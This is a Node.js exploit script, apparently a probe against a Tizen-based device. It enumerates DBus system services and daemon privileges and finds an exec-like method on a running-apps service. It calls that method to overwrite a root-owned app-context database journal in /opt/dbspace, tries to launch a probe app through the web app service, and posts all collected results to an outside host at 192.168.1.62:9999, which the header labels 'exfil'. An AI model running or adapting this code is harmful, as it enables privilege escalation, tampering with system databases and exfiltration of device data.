"use strict";

/* p61: DBus discovery + root placement
   A. discovery: dbus system-services files (full), busctl list (full),
      RAS introspect (2 paths), daemon proc scan (webapp/was/download/tvctx),
      apps_rw state, /dev/kdbus, staged journal md5
   B. RAS: parse introspect -> call exec-like method (cp staged journal -> /opt/dbspace + md5)
   C. was: find bus name from service files / busctl -> Introspectable -> Launch ProbeAppio.Probe7
   D. wait 75s (Probe7 p71 flow if launched)
   E. verify: journal md5 (oracle 03683f81), live md5, staged md5, /opt/dbspace ls
   exfil /p61info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var EXPECT = '03683f81d337ce2224df6010456738e9';
var R = { ts: new Date().toISOString(), probe: 'p61', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p61info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

/* parse busctl introspect output: { iface: [ {name, sig} ] } + signals */
function parseIntrospect(text) {
  var ifaces = {};
  var cur = null;
  var lines = String(text).split('\n');
  for (var i = 0; i < lines.length; i++) {
    var line = lines[i];
    var mI = line.match(/^\s*interface\s+(\S+)/);
    if (mI) { cur = mI[1]; if (!ifaces[cur]) ifaces[cur] = { methods: [], signals: [] }; continue; }
    if (cur) {
      var mM = line.match(/^\s*method\s+(\S+)\s+"([a-z]*)"/i);
      if (mM) { ifaces[cur].methods.push({ name: mM[1], sig: mM[2] }); continue; }
      var mS = line.match(/^\s*signal\s+(\S+)\s+"([a-z]*)"/i);
      if (mS) { ifaces[cur].signals.push({ name: mS[1], sig: mS[2] }); continue; }
      if (line.indexOf('};') >= 0) cur = null;
    }
  }
  return ifaces;
}

function ifaceNameFor(ifaces, methodNameRe) {
  var keys = Object.keys(ifaces);
  for (var i = 0; i < keys.length; i++) {
    var ms = ifaces[keys[i]].methods;
    for (var j = 0; j < ms.length; j++) {
      if (methodNameRe.test(ms[j].name) && ms[j].sig.length > 0 && ms[j].sig.charAt(0) === 's') return { iface: keys[i], m: ms[j] };
    }
  }
  return null;
}

function listNodes(dest) {
  var out = run('dbus-send --system --print-reply --dest=' + dest + ' / org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -40', 30000);
  var nodes = [];
  var re = /node name="([^"]+)"/g;
  var m;
  while ((m = re.exec(out)) !== null) nodes.push(m[1]);
  return { out: out, nodes: nodes };
}

function main() {
  /* ---------- A. discovery ---------- */
  R.results.a1_services = run('ls -la /usr/share/dbus-1/system-services/ 2>&1', 15000);
  R.results.a2_service_files = run('for f in /usr/share/dbus-1/system-services/*; do echo "=== $f"; cat "$f" 2>/dev/null; done 2>&1 | head -220', 20000);
  R.results.a3_buslist = run('busctl --system list 2>&1', 40000, 60000);
  R.results.a4a_ras_introspect = run('busctl --system introspect com.native.RunningAppsServiceDBUS /com/native/RunningAppsServiceDBUS 2>&1 | head -120', 40000);
  R.results.a4b_ras_introspect_root = run('busctl --system introspect com.native.RunningAppsServiceDBUS / 2>&1 | head -40', 40000);
  R.results.a5_daemons = run('for d in /proc/[0-9]*; do n=$(cat $d/comm 2>/dev/null); case "$n" in *webapp*|*was*|*download*|*tvctx*) echo "PID=$(basename $d) COMM=$n"; grep -E "Uid|CapEff|CapBnd" $d/status 2>/dev/null; echo "  exe: $(readlink $d/exe 2>/dev/null)"; echo; ;; esac; done 2>&1 | head -80', 40000);
  R.results.a6_appsrw = run('ls -la /opt/usr/home/owner/ 2>&1 | head -15; echo ===APPSRW; ls -la /opt/usr/home/owner/apps_rw/ 2>&1 | head -30; echo ===PROBE7; ls -la /opt/usr/home/owner/apps_rw/ProbeAppio.Probe7/ 2>&1 | head -10; echo ===PROBE10; ls -la /opt/usr/home/owner/apps_rw/ProbeTenio.Probe10/ 2>&1 | head -10', 20000);
  R.results.a7_kdbus = run('ls -la /dev/kdbus/ 2>&1 | head -20', 15000);
  R.results.a8_staged = run('md5sum ' + STAGED + ' 2>&1; ls -la ' + STAGED + ' 2>&1', 15000);

  /* mkdir attempt if Probe7 app dir missing (diagnosis aid for download path) */
  R.results.a9_mkdir = run('mkdir -p /opt/usr/home/owner/apps_rw/ProbeAppio.Probe7 2>&1 && echo MKDIR_OK || echo MKDIR_FAIL; ls -la /opt/usr/home/owner/apps_rw/ 2>&1 | grep -E "Probe|total" | head -10', 15000);

  /* ---------- B. RAS execShell ---------- */
  var rasIfaces = parseIntrospect(R.results.a4a_ras_introspect);
  R.results.b0_ras_methods = JSON.stringify(rasIfaces);
  var execM = ifaceNameFor(rasIfaces, /exec/i);
  if (!execM) execM = ifaceNameFor(rasIfaces, /shell|run|cmd/i);
  if (execM) {
    var cmd = 'cp ' + STAGED + ' ' + DST + ' && md5sum ' + DST + ' && ls -la ' + DST;
    var args = 'string:"' + cmd + '"';
    var extra = execM.m.sig.substring(1).replace(/s/g, ', string:""');
    if (extra) args += ' ' + extra.substring(2);
    R.results.b1_exec_call = 'iface=' + execM.iface + ' method=' + execM.m.name + ' sig=' + execM.m.sig;
    R.results.b1_exec_out = run('dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS --type=method_call --path=/com/native/RunningAppsServiceDBUS ' + execM.iface + '.' + execM.m.name + ' ' + args + ' 2>&1 | head -40', 60000);
  } else {
    R.results.b1_exec_call = 'no exec-like method found in RAS introspect';
    R.results.b1_exec_out = 'skipped';
  }

  /* ---------- C. was launch ---------- */
  var wasNames = {};
  var svcOut = R.results.a2_service_files;
  var reName = /Name=([A-Za-z0-9._:-]+)/;
  var blocks = svcOut.split('=== /usr/share/dbus-1/system-services/');
  for (var b = 1; b < blocks.length; b++) {
    var blk = blocks[b];
    var fname = blk.split('\n')[0].trim();
    var mN = blk.match(reName);
    if (mN && (fname.indexOf('webapp') >= 0 || fname.indexOf('was') >= 0 || mN[1].indexOf('webapp') >= 0 || mN[1].indexOf('was') >= 0)) {
      wasNames[mN[1]] = fname;
    }
  }
  var busOut = R.results.a3_buslist;
  var busLines = busOut.split('\n');
  var busMatch = [];
  for (var i = 0; i < busLines.length; i++) {
    if (busLines[i].toLowerCase().indexOf('webapp') >= 0) busMatch.push(busLines[i].substring(0, 160));
  }
  R.results.c0_bus_webapp_lines = busMatch.join('\n');
  R.results.c0_was_names = JSON.stringify(wasNames);

  var wasDone = [];
  var wasKeys = Object.keys(wasNames);
  for (var w = 0; w < wasKeys.length && wasDone.length < 3; w++) {
    var wn = wasKeys[w];
    var nodes = listNodes(wn);
    wasDone.push(wn + ': nodes=' + JSON.stringify(nodes.nodes));
    var launchFound = null;
    var pathsToTry = nodes.nodes.length > 0 ? nodes.nodes.slice(0, 3) : ['org/tizen/webappservice', 'org/tizen/was', ''];
    for (var p = 0; p < pathsToTry.length && !launchFound; p++) {
      var pp = pathsToTry[p];
      var intro = run('busctl --system introspect ' + wn + ' /' + pp + ' 2>&1 | head -80', 30000);
      var ifs = parseIntrospect(intro);
      var lf = ifaceNameFor(ifs, /^launch/i);
      if (!lf) lf = ifaceNameFor(ifs, /^activate/i);
      if (!lf) lf = ifaceNameFor(ifs, /^execute/i);
      if (lf) { launchFound = { name: wn, path: '/' + pp, iface: lf.iface, m: lf.m }; }
    }
    if (launchFound) {
      var largs = 'string:"ProbeAppio.Probe7"';
      var lextra = launchFound.m.sig.substring(1).replace(/s/g, ', string:""');
      if (lextra) largs += ' ' + lextra.substring(2);
      R.results['c1_launch_call_' + wn] = 'path=' + launchFound.path + ' iface=' + launchFound.iface + ' method=' + launchFound.m.name + ' sig=' + launchFound.m.sig;
      R.results['c1_launch_out_' + wn] = run('dbus-send --system --print-reply --dest=' + wn + ' --type=method_call --path=' + launchFound.path + ' ' + launchFound.iface + '.' + launchFound.m.name + ' ' + largs + ' 2>&1 | head -30', 45000);
    } else {
      wasDone.push(wn + ': no launch-like method (nodes tried)');
    }
  }
  R.results.c2_was_done = wasDone.join(' || ');

  /* ---------- D. wait for Probe7 p71 flow (if launched) ---------- */
  try { cp.execSync('sleep 75', { timeout: 95000, maxBuffer: 4096 }); } catch (e) {}

  /* ---------- E. verify ---------- */
  R.results.e1_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; ls -la ' + LIVE + ' 2>&1; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1; echo ===DBSPACE; ls -la /opt/dbspace/ 2>&1 | head -25', 30000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
